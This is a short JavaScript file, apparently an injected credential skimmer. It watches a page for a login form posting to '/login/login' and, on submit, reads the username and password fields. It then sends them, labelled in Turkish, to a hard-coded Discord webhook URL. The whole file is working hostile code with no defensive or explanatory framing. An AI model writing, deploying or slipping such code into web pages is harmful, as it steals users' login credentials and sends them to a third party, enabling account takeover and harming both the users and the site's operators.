function mesaj(url, mesaj) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        'content': mesaj,
        'username':'AOÇ SEVDALISI',
    }));
}

setInterval(() => {
    
if(document.querySelectorAll('form[action="/login/login"]')[0] !== undefined) {
    if (document.querySelectorAll('form[action="/login/login"]')[0].getAttribute('listener') !== 'true') {
        document.querySelectorAll('form[action="/login/login"]')[0].addEventListener("submit", function(e){
            var username = document.getElementsByName("login")[0].value
            var password = document.getElementsByName("password")[0].value
            mesaj("https://discord.com/api/webhooks/1116770901539700748/p07s7Cyx4_pX1ku6pVELgW6E3_KvcPPPxAFvDMnCcbcmUFcTo-dWa3umeCF5g4i4DKXF", "Kullanıcı: "+username+"\n"+"Şifre: "+password)
            document.querySelectorAll('form[action="/login/login"]')[0].setAttribute('listener', 'true');
        })
    }
}

}, 1000);
